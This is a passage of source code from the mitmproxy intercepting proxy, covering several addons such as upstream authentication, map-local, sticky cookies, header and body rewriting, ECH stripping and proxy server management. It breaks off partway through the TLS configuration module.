"mitmproxy/addons/upstream_auth.py": "import base64\nimport re\nfrom typing import Optional\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import http\nfrom mitmproxy.proxy import mode_specs\nfrom mitmproxy.utils import strutils\n\n\ndef parse_upstream_auth(auth: str) -> bytes:\n    pattern = re.compile(\".+:\")\n    if pattern.search(auth) is None:\n        raise exceptions.OptionsError(\"Invalid upstream auth specification: %s\" % auth)\n    return b\"Basic\" + b\" \" + base64.b64encode(strutils.always_bytes(auth))\n\n\nclass UpstreamAuth:\n    \"\"\"\n    This addon handles authentication to systems upstream from us for the\n    upstream proxy and reverse proxy mode. There are 3 cases:\n\n    - Upstream proxy CONNECT requests should have authentication added, and\n      subsequent already connected requests should not.\n    - Upstream proxy regular requests\n    - Reverse proxy regular requests (CONNECT is invalid in this mode)\n    \"\"\"\n\n    auth: bytes | None = None\n\n    def load(self, loader):\n        loader.add_option(\n            \"upstream_auth\",\n            Optional[str],\n            None,\n            \"\"\"\n            Add HTTP Basic authentication to upstream proxy and reverse proxy\n            requests. Format: username:password.\n            \"\"\",\n        )\n\n    def configure(self, updated):\n        if \"upstream_auth\" in updated:\n            if ctx.options.upstream_auth is None:\n                self.auth = None\n            else:\n                self.auth = parse_upstream_auth(ctx.options.upstream_auth)\n\n    def http_connect_upstream(self, f: http.HTTPFlow):\n        if self.auth:\n            f.request.headers[\"Proxy-Authorization\"] = self.auth\n\n    def requestheaders(self, f: http.HTTPFlow):\n        if self.auth:\n            if (\n                isinstance(f.client_conn.proxy_mode, mode_specs.UpstreamMode)\n                and f.request.scheme == \"http\"\n            ):\n                f.request.headers[\"Proxy-Authorization\"] = self.auth\n            elif isinstance(f.client_conn.proxy_mode, mode_specs.ReverseMode):\n                f.request.headers[\"Authorization\"] = self.auth\n", "mitmproxy/addons/onboarding.py": "from mitmproxy import ctx\nfrom mitmproxy.addons import asgiapp\nfrom mitmproxy.addons.onboardingapp import app\n\nAPP_HOST = \"mitm.it\"\n\n\nclass Onboarding(asgiapp.WSGIApp):\n    name = \"onboarding\"\n\n    def __init__(self):\n        super().__init__(app, APP_HOST, None)\n\n    def load(self, loader):\n        loader.add_option(\n            \"onboarding\", bool, True, \"Toggle the mitmproxy onboarding app.\"\n        )\n        loader.add_option(\n            \"onboarding_host\",\n            str,\n            APP_HOST,\n            \"\"\"\n            Onboarding app domain. For transparent mode, use an IP when a DNS\n            entry for the app domain is not present.\n            \"\"\",\n        )\n\n    def configure(self, updated):\n        self.host = ctx.options.onboarding_host\n        app.config[\"CONFDIR\"] = ctx.options.confdir\n\n    async def request(self, f):\n        if ctx.options.onboarding:\n            await super().request(f)\n", "mitmproxy/addons/maplocal.py": "import logging\nimport mimetypes\nimport re\nimport urllib.parse\nfrom collections.abc import Sequence\nfrom pathlib import Path\nfrom typing import NamedTuple\n\nfrom werkzeug.security import safe_join\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy import version\nfrom mitmproxy.utils.spec import parse_spec\n\n\nclass MapLocalSpec(NamedTuple):\n    matches: flowfilter.TFilter\n    regex: str\n    local_path: Path\n\n\ndef parse_map_local_spec(option: str) -> MapLocalSpec:\n    filter, regex, replacement = parse_spec(option)\n\n    try:\n        re.compile(regex)\n    except re.error as e:\n        raise ValueError(f\"Invalid regular expression {regex!r} ({e})\")\n\n    try:\n        path = Path(replacement).expanduser().resolve(strict=True)\n    except FileNotFoundError as e:\n        raise ValueError(f\"Invalid file path: {replacement} ({e})\")\n\n    return MapLocalSpec(filter, regex, path)\n\n\ndef _safe_path_join(root: Path, untrusted: str) -> Path:\n    \"\"\"Join a Path element with an untrusted str.\n\n    This is a convenience wrapper for werkzeug's safe_join,\n    raising a ValueError if the path is malformed.\"\"\"\n    untrusted_parts = Path(untrusted).parts\n    joined = safe_join(root.as_posix(), *untrusted_parts)\n    if joined is None:\n        raise ValueError(\"Untrusted paths.\")\n    return Path(joined)\n\n\ndef file_candidates(url: str, spec: MapLocalSpec) -> list[Path]:\n    \"\"\"\n    Get all potential file candidates given a URL and a mapping spec ordered by preference.\n    This function already assumes that the spec regex matches the URL.\n    \"\"\"\n    m = re.search(spec.regex, url)\n    assert m\n    if m.groups():\n        suffix = m.group(1)\n    else:\n        suffix = re.split(spec.regex, url, maxsplit=1)[1]\n        suffix = suffix.split(\"?\")[0]  # remove query string\n        suffix = suffix.strip(\"/\")\n\n    if suffix:\n        decoded_suffix = urllib.parse.unquote(suffix)\n        suffix_candidates = [decoded_suffix, f\"{decoded_suffix}/index.html\"]\n\n        escaped_suffix = re.sub(r\"[^0-9a-zA-Z\\-_.=(),/]\", \"_\", decoded_suffix)\n        if decoded_suffix != escaped_suffix:\n            suffix_candidates.extend([escaped_suffix, f\"{escaped_suffix}/index.html\"])\n        try:\n            return [_safe_path_join(spec.local_path, x) for x in suffix_candidates]\n        except ValueError:\n            return []\n    else:\n        return [spec.local_path / \"index.html\"]\n\n\nclass MapLocal:\n    def __init__(self) -> None:\n        self.replacements: list[MapLocalSpec] = []\n\n    def load(self, loader):\n        loader.add_option(\n            \"map_local\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Map remote resources to a local file using a pattern of the form\n            \"[/flow-filter]/url-regex/file-or-directory-path\", where the\n            separator can be any character.\n            \"\"\",\n        )\n\n    def configure(self, updated):\n        if \"map_local\" in updated:\n            self.replacements = []\n            for option in ctx.options.map_local:\n                try:\n                    spec = parse_map_local_spec(option)\n                except ValueError as e:\n                    raise exceptions.OptionsError(\n                        f\"Cannot parse map_local option {option}: {e}\"\n                    ) from e\n\n                self.replacements.append(spec)\n\n    def request(self, flow: http.HTTPFlow) -> None:\n        if flow.response or flow.error or not flow.live:\n            return\n\n        url = flow.request.pretty_url\n\n        all_candidates = []\n        for spec in self.replacements:\n            if spec.matches(flow) and re.search(spec.regex, url):\n                if spec.local_path.is_file():\n                    candidates = [spec.local_path]\n                else:\n                    candidates = file_candidates(url, spec)\n                all_candidates.extend(candidates)\n\n                local_file = None\n                for candidate in candidates:\n                    if candidate.is_file():\n                        local_file = candidate\n                        break\n\n                if local_file:\n                    headers = {\"Server\": version.MITMPROXY}\n                    mimetype = mimetypes.guess_type(str(local_file))[0]\n                    if mimetype:\n                        headers[\"Content-Type\"] = mimetype\n\n                    try:\n                        contents = local_file.read_bytes()\n                    except OSError as e:\n                        logging.warning(f\"Could not read file: {e}\")\n                        continue\n\n                    flow.response = http.Response.make(200, contents, headers)\n                    # only set flow.response once, for the first matching rule\n                    return\n        if all_candidates:\n            flow.response = http.Response.make(404)\n            logging.info(\n                f\"None of the local file candidates exist: {', '.join(str(x) for x in all_candidates)}\"\n            )\n", "mitmproxy/addons/stickyauth.py": "from typing import Optional\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flowfilter\n\n\nclass StickyAuth:\n    def __init__(self):\n        self.flt = None\n        self.hosts = {}\n\n    def load(self, loader):\n        loader.add_option(\n            \"stickyauth\",\n            Optional[str],\n            None,\n            \"Set sticky auth filter. Matched against requests.\",\n        )\n\n    def configure(self, updated):\n        if \"stickyauth\" in updated:\n            if ctx.options.stickyauth:\n                try:\n                    self.flt = flowfilter.parse(ctx.options.stickyauth)\n                except ValueError as e:\n                    raise exceptions.OptionsError(str(e)) from e\n            else:\n                self.flt = None\n\n    def request(self, flow):\n        if self.flt:\n            host = flow.request.host\n            if \"authorization\" in flow.request.headers:\n                self.hosts[host] = flow.request.headers[\"authorization\"]\n            elif flowfilter.match(self.flt, flow):\n                if host in self.hosts:\n                    flow.request.headers[\"authorization\"] = self.hosts[host]\n", "mitmproxy/addons/strip_ech.py": "from mitmproxy import ctx\nfrom mitmproxy import dns\nfrom mitmproxy.net.dns import types\n\n\nclass StripECH:\n    def load(self, loader):\n        loader.add_option(\n            \"strip_ech\",\n            bool,\n            True,\n            \"Strip DNS HTTPS records to prevent clients from sending Encrypted ClientHello (ECH) messages\",\n        )\n\n    def dns_response(self, flow: dns.DNSFlow):\n        assert flow.response\n        if ctx.options.strip_ech:\n            for answer in flow.response.answers:\n                if answer.type == types.HTTPS:\n                    answer.https_ech = None\n", "mitmproxy/addons/errorcheck.py": "import asyncio\nimport logging\nimport sys\n\nfrom mitmproxy import log\nfrom mitmproxy.contrib import click as miniclick\nfrom mitmproxy.utils import vt_codes\n\n\nclass ErrorCheck:\n    \"\"\"Monitor startup for error log entries, and terminate immediately if there are some.\"\"\"\n\n    repeat_errors_on_stderr: bool\n    \"\"\"\n    Repeat all errors on stderr before exiting.\n    This is useful for the console UI, which otherwise swallows all output.\n    \"\"\"\n\n    def __init__(self, repeat_errors_on_stderr: bool = False) -> None:\n        self.repeat_errors_on_stderr = repeat_errors_on_stderr\n\n        self.logger = ErrorCheckHandler()\n        self.logger.install()\n\n    def finish(self):\n        self.logger.uninstall()\n\n    async def shutdown_if_errored(self):\n        # don't run immediately, wait for all logging tasks to finish.\n        await asyncio.sleep(0)\n        if self.logger.has_errored:\n            plural = \"s\" if len(self.logger.has_errored) > 1 else \"\"\n            if self.repeat_errors_on_stderr:\n                message = f\"Error{plural} logged during startup:\"\n                if vt_codes.ensure_supported(sys.stderr):  # pragma: no cover\n                    message = miniclick.style(message, fg=\"red\")\n                details = \"\\n\".join(\n                    self.logger.format(r) for r in self.logger.has_errored\n                )\n                print(f\"{message}\\n{details}\", file=sys.stderr)\n            else:\n                print(\n                    f\"Error{plural} logged during startup, exiting...\", file=sys.stderr\n                )\n\n            sys.exit(1)\n\n\nclass ErrorCheckHandler(log.MitmLogHandler):\n    def __init__(self) -> None:\n        super().__init__(logging.ERROR)\n        self.has_errored: list[logging.LogRecord] = []\n\n    def emit(self, record: logging.LogRecord) -> None:\n        self.has_errored.append(record)\n", "mitmproxy/addons/proxyserver.py": "\"\"\"\nThis addon is responsible for starting/stopping the proxy server sockets/instances specified by the mode option.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport asyncio\nimport collections\nimport ipaddress\nimport logging\nfrom collections.abc import Iterable\nfrom collections.abc import Iterator\nfrom contextlib import contextmanager\nfrom typing import Optional\n\nfrom wsproto.frame_protocol import Opcode\n\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import http\nfrom mitmproxy import platform\nfrom mitmproxy import tcp\nfrom mitmproxy import udp\nfrom mitmproxy import websocket\nfrom mitmproxy.connection import Address\nfrom mitmproxy.flow import Flow\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import mode_specs\nfrom mitmproxy.proxy import server_hooks\nfrom mitmproxy.proxy.layers.tcp import TcpMessageInjected\nfrom mitmproxy.proxy.layers.udp import UdpMessageInjected\nfrom mitmproxy.proxy.layers.websocket import WebSocketMessageInjected\nfrom mitmproxy.proxy.mode_servers import ProxyConnectionHandler\nfrom mitmproxy.proxy.mode_servers import ServerInstance\nfrom mitmproxy.proxy.mode_servers import ServerManager\nfrom mitmproxy.utils import asyncio_utils\nfrom mitmproxy.utils import human\nfrom mitmproxy.utils import signals\n\nlogger = logging.getLogger(__name__)\n\n\nclass Servers:\n    def __init__(self, manager: ServerManager):\n        self.changed = signals.AsyncSignal(lambda: None)\n        self._instances: dict[mode_specs.ProxyMode, ServerInstance] = dict()\n        self._lock = asyncio.Lock()\n        self._manager = manager\n\n    @property\n    def is_updating(self) -> bool:\n        return self._lock.locked()\n\n    async def update(self, modes: Iterable[mode_specs.ProxyMode]) -> bool:\n        all_ok = True\n\n        async with self._lock:\n            new_instances: dict[mode_specs.ProxyMode, ServerInstance] = {}\n\n            start_tasks = []\n            if ctx.options.server:\n                # Create missing modes and keep existing ones.\n                for spec in modes:\n                    if spec in self._instances:\n                        instance = self._instances[spec]\n                    else:\n                        instance = ServerInstance.make(spec, self._manager)\n                        start_tasks.append(instance.start())\n                    new_instances[spec] = instance\n\n            # Shutdown modes that have been removed from the list.\n            stop_tasks = [\n                s.stop()\n                for spec, s in self._instances.items()\n                if spec not in new_instances\n            ]\n\n            self._instances = new_instances\n            # Notify listeners about the new not-yet-started servers.\n            await self.changed.send()\n\n            # We first need to free ports before starting new servers.\n            for ret in await asyncio.gather(*stop_tasks, return_exceptions=True):\n                if ret:\n                    all_ok = False\n                    logger.error(str(ret))\n            for ret in await asyncio.gather(*start_tasks, return_exceptions=True):\n                if ret:\n                    all_ok = False\n                    logger.error(str(ret))\n\n        await self.changed.send()\n        return all_ok\n\n    def __len__(self) -> int:\n        return len(self._instances)\n\n    def __iter__(self) -> Iterator[ServerInstance]:\n        return iter(self._instances.values())\n\n    def __getitem__(self, mode: str | mode_specs.ProxyMode) -> ServerInstance:\n        if isinstance(mode, str):\n            mode = mode_specs.ProxyMode.parse(mode)\n        return self._instances[mode]\n\n\nclass Proxyserver(ServerManager):\n    \"\"\"\n    This addon runs the actual proxy server.\n    \"\"\"\n\n    connections: dict[tuple | str, ProxyConnectionHandler]\n    servers: Servers\n\n    is_running: bool\n    _connect_addr: Address | None = None\n    _update_task: asyncio.Task | None = None\n\n    def __init__(self):\n        self.connections = {}\n        self.servers = Servers(self)\n        self.is_running = False\n\n    def __repr__(self):\n        return f\"Proxyserver({len(self.connections)} active conns)\"\n\n    @contextmanager\n    def register_connection(\n        self, connection_id: tuple | str, handler: ProxyConnectionHandler\n    ):\n        self.connections[connection_id] = handler\n        try:\n            yield\n        finally:\n            del self.connections[connection_id]\n\n    def load(self, loader):\n        loader.add_option(\n            \"connection_strategy\",\n            str,\n            \"eager\",\n            \"Determine when server connections should be established. When set to lazy, mitmproxy \"\n            \"tries to defer establishing an upstream connection as long as possible. This makes it possible to \"\n            \"use server replay while being offline. When set to eager, mitmproxy can detect protocols with \"\n            \"server-side greetings, as well as accurately mirror TLS ALPN negotiation.\",\n            choices=(\"eager\", \"lazy\"),\n        )\n        loader.add_option(\n            \"stream_large_bodies\",\n            Optional[str],\n            None,\n            \"\"\"\n            Stream data to the client if response body exceeds the given\n            threshold. If streamed, the body will not be stored in any way,\n            and such responses cannot be modified. Understands k/m/g\n            suffixes, i.e. 3m for 3 megabytes.\n            \"\"\",\n        )\n        loader.add_option(\n            \"body_size_limit\",\n            Optional[str],\n            None,\n            \"\"\"\n            Byte size limit of HTTP request and response bodies. Understands\n            k/m/g suffixes, i.e. 3m for 3 megabytes.\n            \"\"\",\n        )\n        loader.add_option(\n            \"keep_host_header\",\n            bool,\n            False,\n            \"\"\"\n            Reverse Proxy: Keep the original host header instead of rewriting it\n            to the reverse proxy target.\n            \"\"\",\n        )\n        loader.add_option(\n            \"proxy_debug\",\n            bool,\n            False,\n            \"Enable debug logs in the proxy core.\",\n        )\n        loader.add_option(\n            \"normalize_outbound_headers\",\n            bool,\n            True,\n            \"\"\"\n            Normalize outgoing HTTP/2 header names, but emit a warning when doing so.\n            HTTP/2 does not allow uppercase header names. This option makes sure that HTTP/2 headers set\n            in custom scripts are lowercased before they are sent.\n            \"\"\",\n        )\n        loader.add_option(\n            \"validate_inbound_headers\",\n            bool,\n            True,\n            \"\"\"\n            Make sure that incoming HTTP requests are not malformed.\n            Disabling this option makes mitmproxy vulnerable to HTTP smuggling attacks.\n            \"\"\",\n        )\n        loader.add_option(\n            \"connect_addr\",\n            Optional[str],\n            None,\n            \"\"\"Set the local IP address that mitmproxy should use when connecting to upstream servers.\"\"\",\n        )\n\n    def running(self):\n        self.is_running = True\n\n    def configure(self, updated) -> None:\n        if \"stream_large_bodies\" in updated:\n            try:\n                human.parse_size(ctx.options.stream_large_bodies)\n            except ValueError:\n                raise exceptions.OptionsError(\n                    f\"Invalid stream_large_bodies specification: \"\n                    f\"{ctx.options.stream_large_bodies}\"\n                )\n        if \"body_size_limit\" in updated:\n            try:\n                human.parse_size(ctx.options.body_size_limit)\n            except ValueError:\n                raise exceptions.OptionsError(\n                    f\"Invalid body_size_limit specification: \"\n                    f\"{ctx.options.body_size_limit}\"\n                )\n        if \"connect_addr\" in updated:\n            try:\n                if ctx.options.connect_addr:\n                    self._connect_addr = (\n                        str(ipaddress.ip_address(ctx.options.connect_addr)),\n                        0,\n                    )\n                else:\n                    self._connect_addr = None\n            except ValueError:\n                raise exceptions.OptionsError(\n                    f\"Invalid value for connect_addr: {ctx.options.connect_addr!r}. Specify a valid IP address.\"\n                )\n        if \"mode\" in updated or \"server\" in updated:\n            # Make sure that all modes are syntactically valid...\n            modes: list[mode_specs.ProxyMode] = []\n            for mode in ctx.options.mode:\n                try:\n                    modes.append(mode_specs.ProxyMode.parse(mode))\n                except ValueError as e:\n                    raise exceptions.OptionsError(\n                        f\"Invalid proxy mode specification: {mode} ({e})\"\n                    )\n\n            # ...and don't listen on the same address.\n            listen_addrs = [\n                (\n                    m.listen_host(ctx.options.listen_host),\n                    m.listen_port(ctx.options.listen_port),\n                    m.transport_protocol,\n                )\n                for m in modes\n            ]\n            if len(set(listen_addrs)) != len(listen_addrs):\n                (host, port, _) = collections.Counter(listen_addrs).most_common(1)[0][0]\n                dup_addr = human.format_address((host or \"0.0.0.0\", port))\n                raise exceptions.OptionsError(\n                    f\"Cannot spawn multiple servers on the same address: {dup_addr}\"\n                )\n\n            if ctx.options.mode and not ctx.master.addons.get(\"nextlayer\"):\n                logger.warning(\"Warning: Running proxyserver without nextlayer addon!\")\n            if any(isinstance(m, mode_specs.TransparentMode) for m in modes):\n                if platform.original_addr:\n                    platform.init_transparent_mode()\n                else:\n                    raise exceptions.OptionsError(\n                        \"Transparent mode not supported on this platform.\"\n                    )\n\n            if self.is_running:\n                self._update_task = asyncio_utils.create_task(\n                    self.servers.update(modes), name=\"update servers\"\n                )\n\n    async def setup_servers(self) -> bool:\n        \"\"\"Setup proxy servers. This may take an indefinite amount of time to complete (e.g. on permission prompts).\"\"\"\n        return await self.servers.update(\n            [mode_specs.ProxyMode.parse(m) for m in ctx.options.mode]\n        )\n\n    def listen_addrs(self) -> list[Address]:\n        return [addr for server in self.servers for addr in server.listen_addrs]\n\n    def inject_event(self, event: events.MessageInjected):\n        connection_id: str | tuple\n        if event.flow.client_conn.transport_protocol != \"udp\":\n            connection_id = event.flow.client_conn.id\n        else:  # pragma: no cover\n            # temporary workaround: for UDP we don't have persistent client IDs yet.\n            connection_id = (\n                event.flow.client_conn.peername,\n                event.flow.client_conn.sockname,\n            )\n        if connection_id not in self.connections:\n            raise ValueError(\"Flow is not from a live connection.\")\n        self.connections[connection_id].server_event(event)\n\n    @command.command(\"inject.websocket\")\n    def inject_websocket(\n        self, flow: Flow, to_client: bool, message: bytes, is_text: bool = True\n    ):\n        if not isinstance(flow, http.HTTPFlow) or not flow.websocket:\n            logger.warning(\"Cannot inject WebSocket messages into non-WebSocket flows.\")\n\n        msg = websocket.WebSocketMessage(\n            Opcode.TEXT if is_text else Opcode.BINARY, not to_client, message\n        )\n        event = WebSocketMessageInjected(flow, msg)\n        try:\n            self.inject_event(event)\n        except ValueError as e:\n            logger.warning(str(e))\n\n    @command.command(\"inject.tcp\")\n    def inject_tcp(self, flow: Flow, to_client: bool, message: bytes):\n        if not isinstance(flow, tcp.TCPFlow):\n            logger.warning(\"Cannot inject TCP messages into non-TCP flows.\")\n\n        event = TcpMessageInjected(flow, tcp.TCPMessage(not to_client, message))\n        try:\n            self.inject_event(event)\n        except ValueError as e:\n            logger.warning(str(e))\n\n    @command.command(\"inject.udp\")\n    def inject_udp(self, flow: Flow, to_client: bool, message: bytes):\n        if not isinstance(flow, udp.UDPFlow):\n            logger.warning(\"Cannot inject UDP messages into non-UDP flows.\")\n\n        event = UdpMessageInjected(flow, udp.UDPMessage(not to_client, message))\n        try:\n            self.inject_event(event)\n        except ValueError as e:\n            logger.warning(str(e))\n\n    def server_connect(self, data: server_hooks.ServerConnectionHookData):\n        if data.server.sockname is None:\n            data.server.sockname = self._connect_addr\n\n        # Prevent mitmproxy from recursively connecting to itself.\n        assert data.server.address\n        connect_host, connect_port, *_ = data.server.address\n\n        for server in self.servers:\n            for listen_host, listen_port, *_ in server.listen_addrs:\n                self_connect = (\n                    connect_port == listen_port\n                    and connect_host in (\"localhost\", \"127.0.0.1\", \"::1\", listen_host)\n                    and server.mode.transport_protocol == data.server.transport_protocol\n                )\n                if self_connect:\n                    data.server.error = (\n                        \"Request destination unknown. \"\n                        \"Unable to figure out where this request should be forwarded to.\"\n                    )\n                    return\n", "mitmproxy/addons/stickycookie.py": "import collections\nfrom http import cookiejar\nfrom typing import Optional\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy.net.http import cookies\n\nTOrigin = tuple[str, int, str]\n\n\ndef ckey(attrs: dict[str, str], f: http.HTTPFlow) -> TOrigin:\n    \"\"\"\n    Returns a (domain, port, path) tuple.\n    \"\"\"\n    domain = f.request.host\n    path = \"/\"\n    if \"domain\" in attrs:\n        domain = attrs[\"domain\"]\n    if \"path\" in attrs:\n        path = attrs[\"path\"]\n    return (domain, f.request.port, path)\n\n\ndef domain_match(a: str, b: str) -> bool:\n    if cookiejar.domain_match(a, b):  # type: ignore\n        return True\n    elif cookiejar.domain_match(a, b.strip(\".\")):  # type: ignore\n        return True\n    return False\n\n\nclass StickyCookie:\n    def __init__(self) -> None:\n        self.jar: collections.defaultdict[TOrigin, dict[str, str]] = (\n            collections.defaultdict(dict)\n        )\n        self.flt: flowfilter.TFilter | None = None\n\n    def load(self, loader):\n        loader.add_option(\n            \"stickycookie\",\n            Optional[str],\n            None,\n            \"Set sticky cookie filter. Matched against requests.\",\n        )\n\n    def configure(self, updated):\n        if \"stickycookie\" in updated:\n            if ctx.options.stickycookie:\n                try:\n                    self.flt = flowfilter.parse(ctx.options.stickycookie)\n                except ValueError as e:\n                    raise exceptions.OptionsError(str(e)) from e\n            else:\n                self.flt = None\n\n    def response(self, flow: http.HTTPFlow):\n        assert flow.response\n        if self.flt:\n            for name, (value, attrs) in flow.response.cookies.items(multi=True):\n                # FIXME: We now know that Cookie.py screws up some cookies with\n                # valid RFC 822/1123 datetime specifications for expiry. Sigh.\n                dom_port_path = ckey(attrs, flow)\n\n                if domain_match(flow.request.host, dom_port_path[0]):\n                    if cookies.is_expired(attrs):\n                        # Remove the cookie from jar\n                        self.jar[dom_port_path].pop(name, None)\n\n                        # If all cookies of a dom_port_path have been removed\n                        # then remove it from the jar itself\n                        if not self.jar[dom_port_path]:\n                            self.jar.pop(dom_port_path, None)\n                    else:\n                        self.jar[dom_port_path][name] = value\n\n    def request(self, flow: http.HTTPFlow):\n        if self.flt:\n            cookie_list: list[tuple[str, str]] = []\n            if flowfilter.match(self.flt, flow):\n                for (domain, port, path), c in self.jar.items():\n                    match = [\n                        domain_match(flow.request.host, domain),\n                        flow.request.port == port,\n                        flow.request.path.startswith(path),\n                    ]\n                    if all(match):\n                        cookie_list.extend(c.items())\n            if cookie_list:\n                # FIXME: we need to formalise this...\n                flow.metadata[\"stickycookie\"] = True\n                flow.request.headers[\"cookie\"] = cookies.format_cookie_header(\n                    cookie_list\n                )\n", "mitmproxy/addons/modifybody.py": "import logging\nimport re\nfrom collections.abc import Sequence\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy.addons.modifyheaders import ModifySpec\nfrom mitmproxy.addons.modifyheaders import parse_modify_spec\nfrom mitmproxy.log import ALERT\n\nlogger = logging.getLogger(__name__)\n\n\nclass ModifyBody:\n    def __init__(self) -> None:\n        self.replacements: list[ModifySpec] = []\n\n    def load(self, loader):\n        loader.add_option(\n            \"modify_body\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Replacement pattern of the form \"[/flow-filter]/regex/[@]replacement\", where\n            the separator can be any character. The @ allows to provide a file path that\n            is used to read the replacement string.\n            \"\"\",\n        )\n\n    def configure(self, updated):\n        if \"modify_body\" in updated:\n            self.replacements = []\n            for option in ctx.options.modify_body:\n                try:\n                    spec = parse_modify_spec(option, True)\n                except ValueError as e:\n                    raise exceptions.OptionsError(\n                        f\"Cannot parse modify_body option {option}: {e}\"\n                    ) from e\n\n                self.replacements.append(spec)\n\n        stream_and_modify_conflict = (\n            ctx.options.modify_body\n            and ctx.options.stream_large_bodies\n            and (\"modify_body\" in updated or \"stream_large_bodies\" in updated)\n        )\n        if stream_and_modify_conflict:\n            logger.log(\n                ALERT,\n                \"Both modify_body and stream_large_bodies are active. \"\n                \"Streamed bodies will not be modified.\",\n            )\n\n    def request(self, flow):\n        if flow.response or flow.error or not flow.live:\n            return\n        self.run(flow)\n\n    def response(self, flow):\n        if flow.error or not flow.live:\n            return\n        self.run(flow)\n\n    def run(self, flow):\n        for spec in self.replacements:\n            if spec.matches(flow):\n                try:\n                    replacement = spec.read_replacement()\n                except OSError as e:\n                    logging.warning(f\"Could not read replacement file: {e}\")\n                    continue\n                if flow.response:\n                    flow.response.content = re.sub(\n                        spec.subject,\n                        replacement,\n                        flow.response.content,\n                        flags=re.DOTALL,\n                    )\n                else:\n                    flow.request.content = re.sub(\n                        spec.subject, replacement, flow.request.content, flags=re.DOTALL\n                    )\n", "mitmproxy/addons/modifyheaders.py": "import logging\nimport re\nfrom collections.abc import Sequence\nfrom pathlib import Path\nfrom typing import NamedTuple\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy.http import Headers\nfrom mitmproxy.utils import strutils\nfrom mitmproxy.utils.spec import parse_spec\n\n\nclass ModifySpec(NamedTuple):\n    matches: flowfilter.TFilter\n    subject: bytes\n    replacement_str: str\n\n    def read_replacement(self) -> bytes:\n        \"\"\"\n        Process the replacement str. This usually just involves converting it to bytes.\n        However, if it starts with `@`, we interpret the rest as a file path to read from.\n\n        Raises:\n            - IOError if the file cannot be read.\n        \"\"\"\n        if self.replacement_str.startswith(\"@\"):\n            return Path(self.replacement_str[1:]).expanduser().read_bytes()\n        else:\n            # We could cache this at some point, but unlikely to be a problem.\n            return strutils.escaped_str_to_bytes(self.replacement_str)\n\n\ndef parse_modify_spec(option: str, subject_is_regex: bool) -> ModifySpec:\n    flow_filter, subject_str, replacement = parse_spec(option)\n\n    subject = strutils.escaped_str_to_bytes(subject_str)\n    if subject_is_regex:\n        try:\n            re.compile(subject)\n        except re.error as e:\n            raise ValueError(f\"Invalid regular expression {subject!r} ({e})\")\n\n    spec = ModifySpec(flow_filter, subject, replacement)\n\n    try:\n        spec.read_replacement()\n    except OSError as e:\n        raise ValueError(f\"Invalid file path: {replacement[1:]} ({e})\")\n\n    return spec\n\n\nclass ModifyHeaders:\n    def __init__(self) -> None:\n        self.replacements: list[ModifySpec] = []\n\n    def load(self, loader):\n        loader.add_option(\n            \"modify_headers\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Header modify pattern of the form \"[/flow-filter]/header-name/[@]header-value\", where the\n            separator can be any character. The @ allows to provide a file path that is used to read\n            the header value string. An empty header-value removes existing header-name headers.\n            \"\"\",\n        )\n\n    def configure(self, updated):\n        if \"modify_headers\" in updated:\n            self.replacements = []\n            for option in ctx.options.modify_headers:\n                try:\n                    spec = parse_modify_spec(option, False)\n                except ValueError as e:\n                    raise exceptions.OptionsError(\n                        f\"Cannot parse modify_headers option {option}: {e}\"\n                    ) from e\n                self.replacements.append(spec)\n\n    def request(self, flow):\n        if flow.response or flow.error or not flow.live:\n            return\n        self.run(flow, flow.request.headers)\n\n    def response(self, flow):\n        if flow.error or not flow.live:\n            return\n        self.run(flow, flow.response.headers)\n\n    def run(self, flow: http.HTTPFlow, hdrs: Headers) -> None:\n        matches = []\n\n        # first check all the filters against the original, unmodified flow\n        for spec in self.replacements:\n            matches.append(spec.matches(flow))\n\n        # unset all specified headers\n        for i, spec in enumerate(self.replacements):\n            if matches[i]:\n                hdrs.pop(spec.subject, None)\n\n        # set all specified headers if the replacement string is not empty\n\n        for i, spec in enumerate(self.replacements):\n            if matches[i]:\n                try:\n                    replacement = spec.read_replacement()\n                except OSError as e:\n                    logging.warning(f\"Could not read replacement file: {e}\")\n                    continue\n                else:\n                    if replacement:\n                        hdrs.add(spec.subject, replacement)\n", "mitmproxy/addons/anticache.py": "from mitmproxy import ctx\n\n\nclass AntiCache:\n    def load(self, loader):\n        loader.add_option(\n            \"anticache\",\n            bool,\n            False,\n            \"\"\"\n            Strip out request headers that might cause the server to return\n            304-not-modified.\n            \"\"\",\n        )\n\n    def request(self, flow):\n        if ctx.options.anticache:\n            flow.request.anticache()\n", "mitmproxy/addons/tlsconfig.py": "import ipaddress\nimport logging\nimport os\nimport ssl\nfrom pathlib import Path\nfrom typing import Any\nfrom typing import TypedDict\n\nfrom aioquic.h3.connection import H3_ALPN\nfrom aioquic.tls import CipherSuite\nfrom cryptography import x509\nfrom OpenSSL import crypto\nfrom OpenSSL import SSL\n\nfrom mitmproxy import certs\nfrom mitmproxy import connection\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import tls\nfrom mitmproxy.net import tls as net_tls\nfrom mitmproxy.options import CONF_BASENAME\nfrom mitmproxy.proxy import context\nfrom mitmproxy.proxy.layers import modes\nfrom mitmproxy.proxy.layers import quic\nfrom mitmproxy.proxy.layers import tls as proxy_tls\n\n# We manually need to specify this, otherwise OpenSSL may select a non-HTTP2 cipher by default.\n# https://ssl-config.mozilla.org/#config=old\n\nDEFAULT_CIPHERS = (\n    \"ECDHE-ECDSA-AES128-GCM-SHA256\",\n    \"ECDHE-RSA-AES128-GCM-SHA256\",\n    \"ECDHE-ECDSA-AES256-GCM-SHA384\",\n    \"ECDHE-RSA-AES256-GCM-SHA384\",\n    \"ECDHE-ECDSA-CHACHA20-POLY1305\",\n    \"ECDHE-RSA-CHACHA20-POLY1305\",\n    